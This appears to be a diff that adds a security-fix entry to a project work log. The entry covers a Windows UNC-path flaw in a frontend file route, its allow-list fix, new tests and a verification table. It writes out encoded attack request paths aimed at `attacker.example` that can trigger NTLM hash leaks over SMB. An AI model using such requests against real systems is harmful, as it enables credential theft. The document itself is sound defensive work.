@@ -650,3 +650,50 @@ issues below, as approved. One commit per logical change; all were verified befo
 | Browser check (Chromium, built app) | footer note visible at 390 px and 1280 px, no horizontal scroll |
 | Evaluation result files | all 20 byte-identical (SHA-256: `3c64bbe` = `HEAD` = working tree); no evaluation file changed |
 | Secret scan of `3c64bbe..HEAD`; tracked `.env`, database, ZIP, key or scratch files | none |
+
+## Session 14 — 2026-10-26 (security phase 7, step H1: built-UI file route; approved)
+
+Built on `3a4f7b7`. The phase 6 CI run (`40222500018` on `3a4f7b7`) passed all four jobs; only the
+`ubuntu-latest` → Ubuntu 26 migration notice remained. No engine, evaluation, frontend or configuration file changed in
+this step; no `.env`, secret or real database was touched.
+
+### Vulnerability (found in the phase 7 audit, reproduced before fixing)
+`backend/brand_platform/main.py`, the fallback route that serves `frontend/dist`, ran `(dist / path).resolve()` and
+`is_file()` before its `is_relative_to(dist)` check. On Windows, `GET /%5C%5Cattacker.example%5Cshare%5Cx.png` or
+`/%2F%2Fattacker.example/share/x` (and a browser's `///attacker.example/...`) became the UNC path
+`\attacker.example\share\...`, and an interception probe showed both calls receiving it. On a real system those calls
+make Windows try to reach the host over SMB/WebDAV, which can leak the user's NTLM hash. The request is a GET with a
+loopback `Host`, so the local-only guard admits it and any web page could trigger it with an `<img>`. The old route also
+answered a path containing NUL with an unhandled 500. Nothing tested the route (the test settings never mount it).
+
+### Fix
+`ui_file(dist, path)` decides from the path string before any filesystem call: allow-listed segments only
+(`[A-Za-z0-9_-]`, `.` not first or last), no Windows device names, at most 1024 characters; anything else is a 404. An
+allowed path is resolved under `dist` and its containment re-checked (symlinks out of `dist` are refused). Missing files
+and client-side routes still return `index.html`, as before; `/api/*` is unchanged. Every file of the real build is
+still served byte-for-byte.
+
+### Tests
+`backend/tests/test_ui_files.py` (new, 46 tests; 45 pass and the symlink test is skipped on this Windows account, which
+cannot create symlinks). Against the previous route 35 of them fail, including all four that intercept `pathlib` and
+assert no UNC path reaches it.
+
+Corrected while writing the tests (test mistakes, not code defects): the HTTP test client rewrites `//host/...` into a
+different URL, so those cases are sent byte-for-byte with an explicit raw path; and the fixture now enters the
+`TestClient` context so `/api/health` has its startup state.
+
+Disclosure: when running the new tests and a probe against the *previous* route, the UNC cases were sent to it without
+interception, so Windows attempted a name lookup for `attacker.example`. That domain is reserved (RFC 2606) and never
+resolves, so no connection could be made.
+
+### Verification
+| Check | Result |
+|---|---|
+| `backend/tests/test_ui_files.py` | 45 passed, 1 skipped |
+| Backend `pytest` (full), two runs | 258 passed, 1 skipped (213 + 45) |
+| Real launcher + uvicorn, raw paths with `curl --path-as-is` | `/`, asset, client route and `/api/health` 200; `///attacker.example/...`, `%5C%5C`, `%2F%2F`, encoded traversal, `C:\`, NUL all 404 |
+| Engine `test_all_rubric_cases` / `test_round3_polish` / `test_engine_fixes` | 48 / 20 / 97 passed |
+| `verify_marketplace.py`; `evaluation/test_evaluation.py`; `run_evaluation.py --check` | exit 0; 10 passed; reproducible (micro F1 0.92) |
+| `ruff check backend evaluation` | clean |
+| Frontend typecheck / `vitest` / build | clean / 30 passed / exit 0 |
+| Evaluation result files | all 20 byte-identical to `3a4f7b7` |
